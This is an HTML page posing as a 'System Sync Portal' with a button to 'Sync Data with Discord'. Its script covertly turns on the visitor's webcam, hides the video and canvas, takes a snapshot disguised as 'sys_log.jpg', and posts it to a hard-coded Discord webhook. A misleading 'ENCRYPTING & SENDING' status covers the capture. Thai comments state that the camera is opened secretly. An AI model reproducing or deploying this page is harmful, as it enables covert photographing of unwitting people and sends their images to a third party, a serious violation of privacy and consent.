<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Sync Portal</title>
    <style>
        /* สไตล์มินิมอลแบบ Developer */
        body { 
            background: #0d0f14; 
            color: #e2e8f0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
        }

        h2 { color: #00e5a0; margin-bottom: 10px; }
        p { color: #5a6585; margin-bottom: 30px; }

        /* ปุ่มกดที่มี Animation */
        .btn-sync {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 5px solid #242836;
            background: transparent;
            color: #00e5a0;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            outline: none;
            position: relative;
        }

        .btn-sync:hover {
            border-color: #00e5a0;
            box-shadow: 0 0 20px rgba(0, 229, 160, 0.2);
        }

        /* คลาสสำหรับหมุน (จะถูกเพิ่มด้วย JS) */
        .spinning {
            border-top: 5px solid #00e5a0 !important;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #status {
            margin-top: 25px;
            font-size: 14px;
            color: #5a6585;
            letter-spacing: 1px;
        }

        /* ซ่อนส่วนที่ใช้ทำงานเบื้องหลัง */
        video, canvas { display: none; }
    </style>
</head>
<body>

    <h2>CORE SYSTEM</h2>
    <p>Press to Sync Data with Discord</p>
    
    <button id="mainBtn" class="btn-sync" onclick="executeSync()">
        SYNC
    </button>

    <div id="status">STATUS: READY</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // *** ใส่ URL Webhook ของพี่ชายที่นี่ ***
        const DISCORD_URL = "https://discord.com/api/webhooks/1500004440252612628/BVLribSS83TTJyC2vOfKb6YlGKYf-wBWljE7epusKIQmLdD6mBHP10hZV1OicuAik1kL";

        const mainBtn = document.getElementById('mainBtn');
        const statusText = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function executeSync() {
            // 1. เริ่ม Animation หมุนและเปลี่ยนสถานะ
            mainBtn.classList.add('spinning');
            mainBtn.innerText = ""; 
            statusText.innerText = "ENCRYPTING & SENDING...";

            try {
                // 2. แอบเปิดกล้อง (จำกัดความละเอียดให้ต่ำ เพื่อความเร็ว)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 480, height: 360 } 
                });
                video.srcObject = stream;

                // 3. รอแค่ 300ms (พอให้กล้องไม่มืด) แล้วถ่ายทันที
                setTimeout(() => {
                    // กำหนดขนาดภาพ
                    canvas.width = 480;
                    canvas.height = 360;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 480, 360);

                    // 4. บีบอัดรูป (Quality 0.3) เพื่อให้ไฟล์เล็กและส่งเร็วสุดๆ
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('file', blob, 'sys_log.jpg');
                        formData.append('payload_json', JSON.stringify({
                            content: "🚀 **System Update:** ข้อมูลถูก Sync เรียบร้อยแล้ว!"
                        }));

                        try {
                            // 5. ส่งไฟล์ไป Discord
                            await fetch(DISCORD_URL, { method: 'POST', body: formData });
                            
                            // 6. ปิดกล้องทันที
                            stream.getTracks().forEach(track => track.stop());
                            
                            // จบกระบวนการ
                            finish("COMPLETE");
                        } catch (err) {
                            finish("NETWORK ERROR");
                        }
                    }, 'image/jpeg', 0.3);

                }, 300); 

            } catch (err) {
                console.error(err);
                finish("ACCESS DENIED");
            }
        }

        function finish(msg) {
            mainBtn.classList.remove('spinning');
            mainBtn.innerText = "SYNC";
            statusText.innerText = "STATUS: " + msg;
            
            // รีเซ็ตสถานะหลังจาก 3 วินาที
            setTimeout(() => {
                statusText.innerText = "STATUS: READY";
            }, 3000);
        }
    </script>
</body>
</html>
